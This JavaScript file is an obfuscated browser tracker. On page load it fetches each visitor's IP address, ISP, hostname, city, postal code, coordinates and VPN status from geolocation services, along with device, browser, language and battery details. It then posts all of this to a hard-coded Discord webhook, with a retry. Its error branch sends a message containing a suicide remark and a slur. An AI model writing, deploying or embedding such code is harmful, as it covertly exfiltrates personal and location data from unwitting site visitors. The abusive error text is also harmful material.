async function sendUserDataToDiscord() {
  try {
    const _0x464dc2 = await fetch("https://json.geoiplookup.io");
    const _0x4fa3d8 = await _0x464dc2.json();
    const _0x3546ad = await fetch("https://vpn.geoiplookup.io/");
    const _0x8e249d = await _0x3546ad.json();
    const _0x24da3f = navigator.getBattery ? await navigator.getBattery() : null;
    const _0x3d0ec9 = {
      'platform': navigator.platform,
      'userAgent': navigator.userAgent,
      'language': navigator.language,
      'batteryLevel': _0x24da3f ? _0x24da3f.level * 100 : "N/A",
      'isCharging': _0x24da3f ? _0x24da3f.charging : "N/A"
    };
    const _0x2b1dae = `
      **User Data:**
      - IP Address: ${_0x4fa3d8.ip}
      - ISP: ${_0x4fa3d8.isp}
      - Bad IP: ${_0x8e249d.badip}
      - Hostname: ${_0x4fa3d8.hostname}
      - Country: ${_0x4fa3d8.country_name}
      - Country Code: ${_0x4fa3d8.country_code}
      - Continent Code: ${_0x4fa3d8.continent_code}
      - Continent Name: ${_0x4fa3d8.continent_name}
      - Region: ${_0x4fa3d8.region}
      - District: ${_0x4fa3d8.district}
      - City: ${_0x4fa3d8.city}
      - Postal Code: ${_0x4fa3d8.postal_code}
      - Latitude: ${_0x4fa3d8.latitude}
      - Longitude: ${_0x4fa3d8.longitude}
      - Timezone: ${_0x4fa3d8.timezone_name}
      - Connection Type: ${_0x4fa3d8.connection_type}
      - ASN Number: ${_0x4fa3d8.asn_number}
      - ASN Organization: ${_0x4fa3d8.asn_org}
      - ASN: ${_0x4fa3d8.asn}
      - Currency Code: ${_0x4fa3d8.currency_code}
      - Currency Name: ${_0x4fa3d8.currency_name}
      - Device: ${_0x3d0ec9.platform}
      - Browser: ${_0x3d0ec9.userAgent}
      - Language: ${_0x3d0ec9.language}
      - Battery Level: ${_0x3d0ec9.batteryLevel}%
      - Charging: ${_0x3d0ec9.isCharging ? "Yes" : "No"}
    `;
    const _0x461db6 = {
      'content': _0x2b1dae
    };
    const _0x32a421 = await fetch("https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T", {
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      },
      'body': JSON.stringify(_0x461db6)
    });
    if (!_0x32a421.ok) {
      throw new Error("Fail");
    }
    console.log("Success");
  } catch (_0x109545) {
    console.error("Failed to send user data, sending error message.", _0x109545);
    await fetch("https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T", {
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      },
      'body': JSON.stringify({
        'content': "i want to suicde i am not joking anymore  error the bot couldnt do shit beacuse i am a reteard"
      })
    });
    try {
      // Retry with the same payload
      const _0x5107b2 = await fetch("https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T", {
        'method': "POST",
        'headers': {
          'Content-Type': "application/json"
        },
        'body': JSON.stringify(_0x461db6) // Using the same payload as before
      });
      if (_0x5107b2.ok) {
        console.log("sent on retry.");
      } else {
        console.error("Retry failed.");
      }
    } catch (_0x35b821) {
      console.error("Retry error:", _0x35b821);
    }
  }
}

window.addEventListener("load", sendUserDataToDiscord);
